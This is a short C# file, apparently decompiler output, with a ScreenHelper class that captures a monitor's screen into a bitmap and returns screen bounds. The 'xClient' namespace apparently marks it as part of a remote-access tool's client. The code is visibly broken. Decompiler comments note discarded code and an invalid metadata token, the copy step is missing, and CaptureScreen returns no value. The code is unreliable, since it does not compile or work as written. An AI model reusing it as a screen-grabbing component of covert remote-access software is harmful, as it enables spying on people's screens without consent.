using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace xClient.Core.Helper;

public static class ScreenHelper
{
	private const int SRCCOPY = 13369376;

	public static Bitmap CaptureScreen(int screenNumber)
	{
		//Discarded unreachable code: IL_003f, IL_0067, IL_006c, IL_007f
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		Rectangle bounds = GetBounds(screenNumber);
		Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)925707);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			IntPtr hdc = val2.GetHdc();
			_ = null;
			_ = null;
			_ = IntPtr.Zero;
			/*Error near IL_003a: Invalid metadata token*/;
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
	}

	public static Rectangle GetBounds(int screenNumber)
	{
		return Screen.get_AllScreens()[screenNumber].get_Bounds();
	}
}
